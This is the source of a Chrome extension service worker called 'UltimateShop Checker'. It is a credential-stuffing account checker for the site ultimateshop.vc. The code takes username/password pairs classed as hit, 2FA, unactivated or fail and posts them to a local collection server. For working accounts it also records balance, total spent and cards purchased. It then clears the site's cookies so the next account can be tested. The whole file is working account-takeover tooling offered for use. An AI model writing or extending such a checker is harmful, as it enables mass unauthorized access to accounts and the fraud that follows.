// UltimateShop Checker - Background Service Worker (Multiple Tabs Support)
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === '2fa_detected' || message.type === 'unactivated_detected' || message.type === 'hit_detected' || message.type === 'fail_detected') {
        const { username, password } = message;
        let endpoint;
        let body = { username, password };

        if (message.type === '2fa_detected') {
            endpoint = 'report-2fa';
        } else if (message.type === 'unactivated_detected') {
            endpoint = 'report-unactivated';
        } else if (message.type === 'hit_detected') {
            endpoint = 'report-hit';
            body = {
                username,
                password,
                balance: message.balance,
                totalSpent: message.totalSpent,
                cardsPurchased: message.cardsPurchased
            };
        } else if (message.type === 'fail_detected') {
            endpoint = 'report-fail';
        }

        // Report to local server
        fetch(`http://localhost:5050/${endpoint}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        })
        .then(response => response.json())
        .then(data => {
            console.log(`Reported ${message.type}:`, data);
        })
        .catch(error => {
            console.error(`Error reporting ${message.type}:`, error);
        });

        // Clear cookies for ultimateshop.vc (Multiple Tabs Support)
        chrome.cookies.getAll({ domain: 'ultimateshop.vc' }, (cookies) => {
            cookies.forEach(cookie => {
                const url = `https://${cookie.domain}${cookie.path}`;
                chrome.cookies.remove({ url, name: cookie.name });
            });
            console.log('Cleared cookies for ultimateshop.vc');
            
            // DON'T create new tab - let user control tabs
            // User can manually open new tabs as needed
            // Each tab will work independently with different accounts
        });
    }
});